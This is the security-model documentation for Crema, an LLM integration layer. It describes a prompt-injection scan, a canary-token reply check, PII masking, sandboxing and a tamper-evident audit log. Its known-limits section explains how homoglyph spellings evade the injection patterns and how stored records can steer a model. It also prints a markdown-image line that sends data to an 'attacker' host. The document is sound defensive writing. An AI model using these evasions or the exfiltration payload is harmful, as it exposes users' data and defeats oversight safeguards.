# Crema security model

Crema is a security layer first. This page states each guarantee, and each known
limit.

## One entry point

No public function accepts a model name, a provider name, or an API key for an LLM
call. Every call names an interface only. Two System-Manager utility endpoints,
`get_models` and `check_provider`, do take a provider name — they list models and
check connectivity, and neither makes an LLM call. The API key stays inside one
module, `crema/client.py`, in exactly three functions: `_complete` (chat calls),
`_transcribe` (transcription calls), and `_fetch_models` (the model list and
connection check). The key never leaves that module, and never enters redis or any
other cache.

The HTTP surface refuses the internal interface `advanced_ocr`. It is reachable
from Python code only.

## Guardrails

The security checks are one ordered list: the **Guardrails** page in the desk. Each
row is one check. The rows run from top to bottom on the way to the provider. Drag a
row to change the order. Add a row to run a check again, or to add a check another
app installed. Delete a row to stop running it — a deleted row has the same effect
as `Off`, and a deleted built-in row does not come back on a later migrate. Some
checks also undo their own work on the reply: masking puts the real values back, and
the trap removes its token. That undo runs in reverse row order, automatically, and
only for the rows that ran on the way in.

The same check can appear on more than one row — for example two masking rows
filtered to different use cases. Each row keeps its own state; they do not share
one vault.

Order carries meaning. The Reply Check must run last: its token is the last thing
added to the outgoing request, and it must come off the reply before masking puts
the real values back. The shipped default keeps the Reply Check after both Hide
rows.

Each row has an **Action** and a **Use Cases** filter:

| Action | Meaning |
|---|---|
| `Off` | The check does not run. |
| `Log Only` | A finding is recorded on the Crema Log row; the call proceeds. |
| `Retry Once` | One fresh attempt, then stop. Only the Reply Check retries; the other checks treat this as `Block`. |
| `Block` | The call fails with a blocked-call error, and the log records a `Blocked` row. |

Leave **Use Cases** empty to run the check for every use case, or list use-case keys
separated by commas to limit it. The filter always reads the use case the caller
asked for — a call served by a fallback keeps the requested use case's guardrails.

Two positions in the list are fixed by design. The Text Scan runs before the answer
cache and the budget check, so a cached reply can never bypass it — it is free and
fails closed. Every other check runs after the cache and the budget check, so a
cached or budget-stopped call never pays for a check that costs money.

Two checks cannot reach audio: there is no text to scan or mask before the sound is
sent. For the Transcribe use case, only a Hide guardrail set to `Block` has an
effect — it refuses the call. A locally hosted model is the only real control for
audio content.

**Escalation.** Crema ships one standard Notification, "Crema blocked a call",
disabled by default. Enable it to alert a role or a person each time a `Blocked` row
lands in the Crema Log; edit its recipients, channel, and condition like any other
Notification.

**Your own guardrail.** Another app can add a check — an external toxicity API, a
stronger PII detector — through the `crema_guardrails` hook
([docs/configure.md](configure.md#add-your-own-guardrail)). Run a heavy detection
model behind that hook, or behind an LLM gateway a provider entry points at. Crema
stays the policy and audit layer.

## Behind a gateway

Crema checks what needs Frappe context — a record, a field, a user, a permission —
or model cooperation, such as a reply that must echo a token. A check that works on
bare text alone, or that meters an API key rather than a use case, belongs on a
gateway in front of the provider instead. Point a Crema Provider's **Address**
(`base_url`) at a gateway such as litellm-proxy and every call through that
provider routes through it — no code change.

**What to run on the gateway.** Prompt-injection and LLM-classifier guardrails —
litellm-proxy's own, or another vendor's — replace the AI Guard this app carried
before. Secret detection and moderation adapters have no Frappe equivalent either.
For personal data in free text, enable litellm-proxy's Presidio guardrail with
`output_parse_pii` on: it runs a real named-entity model, and it restores its own
placeholders in the reply the same way Crema's own masking does.

**What stays in Crema.** The Text Scan runs before the answer cache; a gateway check
runs after a cache hit already skipped the network call, so it cannot cover a cached
reply. Masking's record-term harvest reads a document and its linked records under
the interface's isolation user — exact values, scoped by Frappe's own permission
rule — which no gateway can do, since a gateway sees one flat string with no
document behind it. The Reply Check needs to write the outgoing system prompt and
read the reply's own structure; a gateway sees neither. Per-interface and per-user
budgets need `frappe.session.user` and the calling interface, an identity a gateway
does not have unless Crema forwards it — see **Pass-through identity** below, in
this same section.

**Order matters.** Crema's own Hide rows run first, inside this app, before the
request ever reaches the gateway. A masked prompt reads `[[NAME_1]]`, not a name —
that is not personal data, so the gateway's own NER passes it through untouched.
Each layer restores only the placeholders it made: Crema restores `[[NAME_1]]`
against its own vault, and the gateway restores whatever it masked against its own
map. Neither layer needs to know the other ran.

**Why Presidio does not live in this app.** `presidio-analyzer` plus a spaCy model
is hundreds of megabytes resident per bench worker, English-biased, and slow to
start — a cost paid on every site, whether or not it uses masking. Its own pattern
recognizers (email, phone, card, IBAN) also duplicate what `mask.py`'s pattern table
already does. A site that wants named-entity detection with no gateway in front of
it can still have it: add a `before()`-only module through the `crema_guardrails`
hook ([docs/configure.md](configure.md#add-your-own-guardrail)) that calls a
Presidio sidecar. That is a worked example, not a bundled dependency.

**Pass-through identity.** Every provider call carries `user` (the real caller,
captured before Crema's own isolation-user sandbox opens) and `metadata.tags` (the
interface that serves the call). Behind litellm-proxy, its own per-end-user and
per-tag spend then lines up with Crema's audit log, with no separate integration
step. In front of no gateway, both fields cost nothing — litellm's SDK sends them
along and nothing else reads them.

## The scan — Text Scan

The scan is a local regex and unicode check. It runs before any network call. It
reads the prompt, the context, and any `history` turns together, because an attack
can split its wording across the fields.

The scan also reads the text that `ask(files=[...])` gets out of a file. This text only
exists after the file is read, so the scan runs a second time on it, just before the
call to the provider. A file that gives an image gives no text to scan.

First the scan checks the raw text for invisible, bidirectional, and control
characters — a soft hyphen or a right-to-left override blocks on its own. Then it
makes the text canonical in four steps, and matches the canonical text against the
injection patterns:

1. It removes the invisible characters that are permitted, so a word split by a
   zero-width joiner becomes one word again.
2. It repairs damaged text, so a phrase that was decoded with the wrong character set
   reads correctly again.
3. It normalizes the text (NFKC), so a fullwidth or other compatibility spelling
   matches the same as its plain form.
4. It changes the text to lowercase ASCII, so a Cyrillic or Greek letter that stands in
   for a Latin letter matches the same as the Latin letter.

A long unbroken base64-like run also blocks: it can hide an instruction from the
patterns. This check reads the raw text, not the canonical text. The scan blocks a call
outright when it finds a match. This is a fail-closed check: the scan blocks an unclear
case, it never passes one through.

The scan is the **Text Scan** row on the Guardrails page. It is on (`Block`) for
every use case by default. `Log Only` records a hit on the log row instead of
blocking; use it to measure false positives on a use case before you decide.

## Guarding against malicious intent

Crema has no built-in AI guard. A second model call that reads only bare text has
no Frappe context to add, and it costs money on every request. Run an LLM guard on
your gateway — litellm-proxy's prompt-injection and LLM guardrails do this job — or
plug in your own check through the `crema_guardrails` hook. See
[Behind a gateway](#behind-a-gateway) below.

## The trap — Reply Check

The trap sends a per-call random token along with the request, and asks the model to
echo it back — on its own last line for a plain-text reply, or as a `"_crema"` key for
a JSON reply. A missing token means the model has stopped following crema's own
system prompt (a hijack). A token that appears a second time, somewhere else in the
reply, means the model is echoing that system prompt back (a leak).

Unlike the scan, the trap does not read the prompt or the context at all — it only
reads what comes back. That makes it the only check that also covers `ocr()` and
`extract()`, which skip the scan on purpose: it is tuned for user prompts and
false-positives on arbitrary document text. `transcribe()` runs with no scan and
no trap — it has no system prompt to protect, so the trap has nothing to arm. The
sandbox, the budget check, and the audit log are its fences.

The trap is the **Reply Check** row on the Guardrails page, `Block` for every use
case by default. Its Action follows the shared ladder: `Log Only` records a miss on
the log row, `Retry Once` makes one fresh attempt with a new token and treats a
second miss as `Block`, `Block` fails the call with a `Blocked` log row. If a model
turns out to drop the token on ordinary, non-adversarial replies, step it down to
`Log Only` — the Crema Log's `trap:`-prefixed detail rows show how often it happens
before you decide — or filter the row to the use cases where it behaves.

## Masking (Experimental)

Two Guardrails rows hide sensitive values before the request leaves the server, and
swap the real values back into the reply. The provider never sees the original text;
it sees only a placeholder — `[[EMAIL_1]]`, `[[NAME_2]]`, `[[PHI_3]]` — and works
with the shape of the document around it. Both rows are off by default.

Masking is pseudonymisation, not anonymisation: the real values stay on this server,
mapped to their placeholders for the length of the call. It is not a legal or
compliance control — under data-protection rules of the GDPR kind, pseudonymised
data is still personal data, because the map back exists. A requirement that data
must not reach a given provider needs a data-processing agreement or a self-hosted
model, not a mask. What masking gives is narrower: less sensitive data lands in the
provider's own logs and prompt caches.

**Hide Personal Information** covers who people are and how to reach them.
Detection is layered, not one regex. Emails, phone numbers, IBANs, card numbers,
IP addresses, and a Mauritian-shaped national ID are matched by pattern. A heuristic
sweep catches a capitalised name the patterns have no rule for. For `transform()`,
and for an automation task's Document Query sources, the record supplies exact terms
too: the record's own title, the name and title of every record it links to, and its
phone and email fields. That record read runs under the interface's own isolation
user, so a value that user cannot read never enters the placeholder list. The other
entry points — `ask()`, `ask_json()`, `extract()`, `ocr()` — have no record to read,
so they rely on the patterns and the sweep alone. The site's default Company is
never masked, so your own organisation's name stays readable in every prompt.

Two or more surface forms of one value — "Mr Ramgoolam" and "Jean-Claude
Ramgoolam" — get linked placeholders (`[[NAME_1]]`, `[[NAME_1.2]]`) rather than one
merged placeholder. The swap back stays exact, and one added system line tells the
model which placeholders refer to the same value.

**Hide Health Information** covers what people are treated for. It is a keyword and
pattern list — common conditions, medications, and procedures — matched
case-insensitively, with spelling variants of one term linked the same way. It is a
keyword list, not a health-information detector: it hides the words on the list so a
provider cannot pair a person with a health fact, and it misses anything phrased
outside the list. A site that needs clinical-grade detection should plug a dedicated
detector in as its own guardrail (see
[docs/configure.md](configure.md#add-your-own-guardrail)).

The built-in list is English only. A site running in another language adds its own
words under **Health Words** (see [docs/configure.md](configure.md#health-words)) —
by hand, or proposed by the Translation use case for a chosen language. A proposed
word is filed switched off: the app never turns one on itself, because an
over-matching word tokenises ordinary text, and on a `Block` row an unresolved token
fails the whole call. Two limits hold whatever language the list is in: a word list
still isn't a detector, and every term is matched as written — a French plural or a
Russian case ending still evades it, the same way an English word outside the list
does today.

Detection over-catches rather than under-catches. The swap back is exact, so a
placeholder over a harmless value only costs the model some comprehension, while a
missed value leaves the server. The false positives this trades away are listed
under [Known limits](#known-limits).

Each row's Action decides what a placeholder that does not come back means. `Log
Only` records the miss on the log row and returns the restored reply — every
placeholder that did come back is swapped for its real value. `Block` fails the call
with a `Blocked` log row. `Retry Once` has no meaning for masking and counts as
`Block`. Two channels cannot be masked at all, because there is no text to hide
anything in: an image handed to a vision model, and audio handed to `transcribe()`.
`Block` refuses those outright; `Log Only` sends them unmasked and records that it
did.

The rows are marked Experimental because the detection heuristics, the placeholder
format, the health keyword list, and the grouping rule may all still change. Nothing
else in Crema depends on them.

## The sandbox

Every document read or write inside a call runs as that interface's isolation user —
the **Runs As** field in the desk.
Frappe's own permission engine — roles and User Permissions — checks each access.
Crema adds almost no permission logic of its own on top. The one addition is an
explicit read check on each File URL a caller names — `ask(files=[...])`, `ocr()`,
`extract()`, and `transcribe()` all resolve a File URL through the same function,
`_ocr._load_bytes`, and it refuses one the calling user cannot read. Inside an
automation run that calling user is the isolation user, same as everything else in the
sandbox; the desk file→record flow instead runs as the browser user who just uploaded
the file, which is correct there too — that File is private and unattached, owned by
the person uploading it, not by the interface's isolation user.

An automation task runs the same way: the whole run — the source read, the plan, the
extraction, and the write — happens as the isolation user. A Document Query
therefore cannot show the model a record that user could not open, and a URL fetch
runs under the same identity as everything after it. See
[automation.md](automation.md).

The isolation user must be a low-privilege, dedicated account. The system refuses
`Administrator` and any user with the `System Manager` role as an isolation user,
because `System Manager` can read a provider's API key. Either choice would remove
the sandbox. The system also refuses a disabled user. These rules apply equally to
Crema Settings' `default_isolation_user` and to a Model Assignment row's own
`isolation_user` override.

The install step creates a default isolation user for you: `crema@<site>` (or
`crema@<site>.localhost` if the site name is not a valid email domain — see
[install.md](install.md)). The
account is enabled, holds only the `Crema User` role, and has no password, so it can
never log in. The install step points `default_isolation_user` at it. It is the
lowest-privilege account Crema ships. Give it more roles or User Permissions only if
you deliberately want the *default* sandbox widened. Never give it `System Manager` —
the `validate_isolation_user` check in the Crema Model Assignment controller rejects
that for this account exactly as for any other.

Every interface with no provider of its own resolves through Crema Settings'
`default_provider`/`default_model`/`default_isolation_user` before falling back per the
chain in [configure.md](configure.md#reference--interfaces-and-the-fallback-chain).

A fallback walk never weakens a call. The requested interface keeps its own prompt
and its own guardrails — every row is matched against the use case the caller asked
for, so there is no per-row posture a fallback could lend or lose; the fallback
lends only its provider, model,
isolation user, and billing identity. See
[configure.md](configure.md#reference--interfaces-and-the-fallback-chain).

The switch to the isolation user and back restores the calling browser session
exactly — the session identity, its cache entry, and the request's form data — not
just the calling user's name.

## The audit log

Every call that reaches the provider writes one row to the Crema Log. A cached hit
writes its own row too (`status = Cached`), so hit rate is computable from the log
alone. An OCR call that escalates to `advanced_ocr` still writes one row, but its
`llm_calls` says 2 — both provider calls are billed under it.

| Field | Notes |
|---|---|
| `interface` | |
| `model` | |
| `user` | The session user. On a row an automation task writes, this is the interface's isolation user — the whole run happens inside the sandbox. |
| `status` | `Success`, `Cached`, `Blocked`, or `Error`. |
| `prompt_sha` | A SHA-256 fingerprint of the full request: interface, model, prompts, context, history, and response format. On an OCR or transcription row: a hash of the file bytes. For correlation only — two identical requests carry the same hash. |
| `chain_seq` | This row's position in the tamper-evidence chain. See "A tamper-evident chain" below. Blank on a row written before this field existed. |
| `chain_sha` | A SHA-256 of this row's own audit fields plus the row before it's `chain_sha`. Blank on a row written before this field existed. |
| `duration_ms` | |
| `detail` | A block reason or an error class. Never the prompt or document content. |
| `llm_calls` | Provider calls billed for this row. Usually 1. |
| `prompt_tokens` / `completion_tokens` / `total_tokens` | From the provider's usage response. |
| `cost_usd` | From litellm's computed cost. 0 if the model isn't in litellm's cost map. |

No field of the log stores the prompt text, the context text, or document content.

On the Crema Log form, `interface_label`, `user`, `status`, `detail`, `total_tokens`, and
`cost_usd` are always visible. `interface`, `model`, `provider`, `prompt_sha`,
`chain_seq`, `chain_sha`, `duration_ms`, `llm_calls`, `prompt_tokens`, and
`completion_tokens` are in a **Details** section. Grouping the fields does not change
what is stored.

### A tamper-evident chain

Each row's `chain_sha` is a SHA-256 of its own audit fields (everything in the table
above except `chain_sha` itself, plus `creation`) chained to the row written before it —
the same shape a blockchain's block hash uses, one row deep. Editing a row's field, or
deleting it outright, changes the hash every row after it was computed from, so the
break is visible the next time someone checks. `chain_seq` fixes the row's true position
in that chain — a plain counter, assigned under the same lock as `chain_sha` — because
two rows can share the same `creation` timestamp down to the microsecond (a burst of
calls in the same instant) and the database gives no other reliable way to tell which
one came first.

Run the check with:

```bash
bench execute crema.log.verify_chain
```

which returns `{"checked": <n>, "ok": <bool>, "first_break": <row name, or null>}`.
`first_break` names the first row that no longer matches what its stored `chain_sha`
says it should — the row itself if a field on it changed, or the row right after a
deleted one (a deleted row has no name left to report).

This is not a signature, and there is no anchor for it outside this database — a
system administrator with a database console can rewrite a whole chain from a deleted
row forward and `verify_chain` will not see it. What it catches is an edit or a
deletion that leaves the rest of the chain in place, which is the ordinary case: a
change made through the desk, a script, or a compromised account, not a full database
rebuild. It is also bounded by retention: the daily job below deletes the oldest rows
outright, and the oldest surviving row's own predecessor is gone with them —
`verify_chain` starts from that row's stored `chain_sha` and cannot check further back
than it.

### The one exception: developer mode

If the site sets `developer_mode` in `site_config.json`, Crema attaches the full text of
every provider call — what it sent and what came back — to its log row, as a comment in
the row's timeline. Provider API keys are removed from that text first, and each side is
cut at 20000 characters.

This is a debugging aid, and it is off on any site that does not set `developer_mode`.
Two things to know before you turn it on:

- Anyone who can read a Crema Log row can read its comments. The log is
  `System Manager` only, so that is the audience.
- The text is stored in the database. The daily retention job deletes each comment with
  the log row it belongs to, so the text has the same lifetime as the row.

Do not set `developer_mode` on a production site.

A daily job deletes rows older than `Crema Settings.log_retention_days` (30 by
default).

## The desk assistant's write actions

The list-view assistant (see [use.md](use.md#list-view)) can propose creating,
editing, or deleting records, not only changing the view. Frappe's own permission
engine is the fence, exactly as it is everywhere else in Crema — the desk UI adds no
*permission* logic of its own. It does add one policy check on top: a doctype on
Crema Settings' Blocked Doctypes table is refused regardless of what Frappe's own
permission engine would allow — see "A site-wide write block" below. Three more
things sit in front of the permission fence, and none of them is itself the fence:

- **The create/edit/delete shapes only appear in the prompt at all** when the session
  user already has that permission on the doctype (`frappe.model.can_create`,
  `frappe.perm.has_perm(doctype, 0, "write" | "delete")`). This stops an unusable
  proposal, and the cost of asking the model for one, before either happens — not an
  unauthorized write, which the save or delete call refuses regardless.
- **A model-authored field list is filtered to writable fields client-side**, the same
  discipline `api._filter_diff` already applies server-side for `transform` and
  `extract` — the `view` interface's raw answer never passes through that server-side
  filter, since its caller (the desk, not another Crema function) is what applies it.
- **Creating or editing one record never writes by itself.** It opens an unsaved form
  with the change already filled in — the diff is shown first, and you save it
  yourself. **Editing or deleting more than one record asks first**: a dialog lists
  every record the request would touch, by name, before the write happens. A request
  naming no records to change or delete is refused outright, never read as "every
  record" — this is the one rule with no Frappe equivalent to fall back on, since a
  filter set is Crema's own construction, not a permission question.

The write itself goes through Frappe's own bulk endpoints
(`frappe.desk.doctype.bulk_update.bulk_update.submit_cancel_or_update_docs`,
`frappe.desk.reportview.delete_items`) — the same code path the desk's own Actions
menu uses, with the same permission check on every record. Both endpoints also need
the Bulk Actions permission on the user; without it, the write is refused.

## A site-wide write block

Crema Settings' Blocked Doctypes table (see
[configure.md](configure.md#block-a-doctype-outright)) is a System Manager's own red
line, checked on top of — not instead of — every other fence on this page. A doctype
listed there is refused for creating, editing, or deleting a record, no matter what
permission an interface's own Runs As account holds:

- **`automation._validate_plan`** refuses a plan whose target doctype, or child-table
  target, is on the list. This runs on every automation task run, so it is the real
  fence for automation — not a save-time convenience.
- **`CremaAutomationTask.validate`** refuses a task whose Target Doctype is already on
  the list, at save time — a task cannot even be pointed at a blocked doctype, let
  alone run against one.
- **The desk assistant's write actions** (above) fold the same check into the same
  create/write/delete gate the session user's own permissions already sit behind —
  `crema_writable_fields` returns nothing, and the create/edit/delete shapes never
  reach the prompt at all.

Like the permission checks it sits beside, this is not silent: a blocked automation
run fails with a plain reason in `last_error`, and a blocked desk action shows a red
message naming the doctype. It only covers create/edit/delete — a blocked doctype is
still readable everywhere Crema reads records today (a Document Query source, the
desk assistant's "view" action), since reading was never the concern this list
answers.

## Kill switch

Two flags, either one stops every LLM call:

- **Crema Settings → Operations → Crema Is Off** — a Check field on the desk. Switch
  it on and the next call is refused with `CremaConfigError`. The desk's own LLM
  features (the robot button, the assistant) stop too.
- **`site_config.json` key `crema_disabled`** — set it to `1` and the desk cannot
  undo it. A restart is not necessary; the check is live on every call.

Either flag kills; clearing both restores service. A killed call writes **no Crema
Log row** — the budget stop logs `Blocked`, but a kill-switch stop logs silence
(the alternative is five extra call sites to produce a log row for the one path
that already raises).

The kill switch does not touch: `automation.cleanup_logs` (retention must keep
running), or `client.check_connection` / `_fetch_models` (an admin needs the
Providers panel during an incident).

## Budgets

Each interface has a `monthly_budget_usd` field (in Crema Settings' Use Cases
grid); a row left at 0 uses `Crema Settings.default_monthly_budget_usd` instead, and 0
there too means unlimited. Once the interface's `cost_usd` sum for the current
calendar month reaches its effective budget, the system blocks the next call on that
interface before it reaches the provider — `CremaBudgetError`, logged as a `Blocked`
row.

Crema Settings also has a `default_monthly_budget_usd_per_user` — a ceiling per
user across all interfaces. The metered identity is `frappe.session.user`, the same
identity `Crema Log.user` records. Two callers are exempt:

- **The Administrator** — a currency ceiling that blocks `bench execute` is a
debugging trap; the interface ceiling still caps the spend.
- **Automation runs** — inside `sandbox.isolation` the session user is the
interface's isolation user, so every task would pool into one meaningless ceiling.

A provider has no budget of its own — a provider is an infrastructure identity, and
that ceiling belongs on the gateway in front of it (see [Behind a
gateway](#behind-a-gateway)). `Crema Log.provider` still records the effective
provider on every row, for audit, not metering.

The `crema_in_automation` flag on `frappe.local` tells `check_budget` to skip the
per-user check.

An OCR call that would escalate checks `advanced_ocr`'s own budget first. If that
budget is already spent, the system skips the escalation and returns the first
attempt's text — it does not block the call itself, because its own spend already
happened. The system also skips the escalation when `advanced_ocr` resolves to the
same provider and model as `ocr` — a retry on the same model has no value (see
[configure.md](configure.md#procedure-b--set-the-defaults-the-fast-path)).

The Crema Settings Use Cases grid shows a live **Usage** column — spend to
date if the interface has no budget, otherwise a percentage of its effective budget,
colour-coded (green under 80%, orange 80–99%, red at 100%+). A cache hit never spends,
and is never blocked by a budget.

After a fallback walk, the budget check charges a call to — and the log attributes
it to — the interface that actually serves it, not the one you asked for.

## Secrets

A provider's API key sits in a Password field. The system decrypts it once per
request, inside `crema/client.py` only, and never writes it to redis or any other
cache. `log.redact` scrubs every provider key touched in the request out of error
text before that text reaches a Crema Log row, a task's `last_error`, or the site
error log.

Every provider call routes through `litellm`, the one dependency with a direct line to
a provider's network address. `pyproject.toml` pins it to `>=1.83,<2` — a floor that
rules out the two compromised releases (1.82.7 and 1.82.8, since pulled from PyPI), and
a ceiling that stops an unreviewed major version from arriving on a routine dependency
bump. `pip-audit`, part of `linters.yml`, is the other half of this control: it flags a
known vulnerability inside that range, the pin flags the range itself.

## Known limits

- `automation._fetch` follows HTTP redirects and applies no private-IP or loopback
  block. This is an accepted risk today, because only a System Manager can set
  `source_url`. The **Dry Run** button also reaches it, from a web request rather
  than only from the scheduler. See [Planned hardening](#planned-hardening) below.
- A File Query source lists `File` rows under the account in **Runs As** — the task's
  own if it has one, otherwise the AI profile's. Frappe's own File permission rule
  narrows that listing to `owner = <account>` for any account that is not a "System
  User" (one with desk access, i.e. at least one role beyond the automatic ones) —
  `is_private` and every other condition are ignored for such an account. An account
  with no role at all can therefore never see a File it does not own, however the
  filters read, and a File Query task on it silently reads nothing every run. Give the
  account a role with desk access — the seeded `Crema User` role is enough — before
  pointing a File Query at it. This is a Frappe permission rule, not a Crema one;
  the same account also needs ordinary read/create rights on `target_doctype`.
- An automation task with a Document Query source reads records that ordinary users
  write. Any user who can edit a field on `source_doctype` can therefore put text in
  front of a model that runs as the interface's isolation user — usually more
  privileged than the writer. The task cannot write outside `target_doctype`, and
  `Update the Records It Read` cannot touch a record outside the batch it read. But the
  *values* the model chooses for the other records in that batch can be steered this
  way. Point a task at a doctype whose content you trust as much as its target.
- The scan is tuned for prompts, not for arbitrary document text, so it has a
  false-positive rate on ordinary records — a soft hyphen pasted from a word
  processor is enough to trip the invisible-character check. A Document Query drops
  the individual records that trip the scan and reports the count in `last_result`,
  rather than failing the whole run. Without that, one odd record would block the
  batch, and five such runs would turn the task off. This per-record drop runs only
  when the Text Scan row applies to the task's use case. There is no such per-record
  drop for `ask(files=[...])`: one file that trips the scan stops that call.
- The scan folds many, but not all, look-alike letters. It changes each letter to the
  Latin letters that give its sound, not to the Latin letter it looks like. The two
  agree for most look-alikes, but not for all of them: the Cyrillic letter "es" looks
  like a Latin "c" but gives "s", and the Cyrillic letter "er" looks like a Latin "p"
  but gives "r". A word spelled with one of these letters still evades every pattern.
  To close this needs a confusables table, which Crema does not have.
- The trap depends on the model actually following the instruction to echo the
  token. A model that drops it on ordinary replies produces a false block when the
  Reply Check row is set to `Block`. There is no way to tell that apart from a real
  hijack syntactically; the Crema Log is what makes the real rate visible.
- Masking over-catches by design: an ordinary two-word place name can mask like a
  person's name, and a sentence-initial word next to a real name can be swept in
  with it. The swap back is exact, so the reply still reads correctly — the cost is
  model comprehension, not correctness.
- Hide Health Information hides only the terms on its keyword list (the built-in
  English list plus any Health Words a site adds). A health fact phrased outside the
  list, in any language, reaches the provider unmasked.
- Masking is a text-only control. An image or an audio file has no text to mask, so
  it reaches the provider as-is unless a Hide row set to `Block` refuses the call.
- Crema's own desk UI escapes every model reply before it touches the page. An app
  that embeds Crema and renders a reply as markdown or HTML re-opens the channel that
  escaping closes: a reply carrying `![](https://attacker/?d=...)` makes the browser
  send data to a third party on render, with no click. The scan does not block
  markdown images on the way in, because legitimate documents carry them (see
  `security.py`'s own note). An embedding app must strip or allow-list image and link
  targets before it renders a reply — the output-side content filter hook under
  [Planned hardening](#planned-hardening) is the future home for that.

## Planned hardening

Work not yet done, kept here rather than in ROADMAP.md because each item is a gap in a
guarantee this page already states.

- **SSRF egress control for `automation._fetch`.** A deny-list for private and
  loopback addresses (or an allow-listed egress proxy), closing the redirect-following
  gap the Known limits section above describes.
- **Per-app scan patterns.** An installed app can register a new interface through
  `crema_interfaces`, but has no way to add its own injection patterns to the scan —
  `security.scan` has to stay free of any Frappe import, so this has to be a
  caller-side merge one level up (the same shape `_scan_context` already uses for
  `history`), not a hooks lookup inside `scan()` itself.
- **An output-side content filter hook.** `log.redact` only scrubs a provider's own
  API key out of error text — never the model's reply. A consuming app that needs a
  PII or secret-term filter on every response runs its own regex layer today; Crema
  has no equivalent hook.
- **A user-scoped response cache.** The response cache is addressed by content hash
  alone — interface, model, system prompt, prompt, context, and history, but no user
  and no permission state. A reply cached for one user is served to any other user
  who produces the identical resolved prompt. Context assembly runs under the
  interface's isolation user, so an identical prompt implies identical readable
  inputs — but that argument holds only while it is written down and tested, and it
  says nothing about the second, smaller gap: the hash carries the *resolved*
  interface name, so two requested interfaces that fall back to the same provider and
  share a system prompt collide into one cache entry. The fix shape: add the session
  user (or a hash of the user's effective permissions) and the requested interface
  name to the cache key, or record precisely why each omission is safe.
- **Version stamping in audit rows.** A log row records the *configured* model id,
  never the model the provider actually served (`response.model` is read nowhere), and
  no crema app version. A silent provider-side model bump changes behaviour with no
  trail, and an incident cannot be replayed against the exact stack that produced it.
  Record both, and add the new fields to the log's tamper-evident `CHAIN_FIELDS`.
- **The scan's scope is frozen.** Text Scan stays exactly what it is today: a
  deterministic, offline, fail-closed pre-filter — the invisible/bidi/control
  character block, the long-base64 block, the four-step canonicalisation, and the
  literal injection-pattern list, with no Frappe import and no network call. Nothing
  on this list grows the scan into a second, fuzzier layer:
  1. *Homoglyph folding — shipped, partially.* The remaining look-alike-letter gap
     stays a **Known limit**, not a task — closing it needs a Unicode
     confusables-skeleton pass, and nothing here schedules one.
  2. *A false-positive corpus.* Any new literal pattern still needs a fixture set of
     ordinary business text that must stay clean before it ships — the same
     discipline every pattern here already needed.
  3. *Not planned, on purpose:* separator squeezing, leet folding, decode-and-
     rescan, a scored second layer, and per-language pattern tables. Each trades the
     scan's one guarantee — deterministic and cheap enough to run before the answer
     cache — for a fuzzier, costlier check. Genuine semantic paraphrase, and any
     text-only check that needs a scored or learned signal, is the gateway's job —
     see [Behind a gateway](#behind-a-gateway).

## Add a new scan pattern

1. Open `crema/security.py`.
2. Append a `(compiled_regex, reason)` tuple to `_INJECTION_PATTERNS`. Use the flags
   `re.I | re.S` — a line break inside a pattern's gap can defeat a pattern that
   lacks `re.S`. Patterns match the canonical text, so write them in plain lowercase
   ASCII: not a fullwidth spelling, and not a spelling with look-alike letters.
3. Add a matching case to the `CASES` table in `crema/test_security.py`.
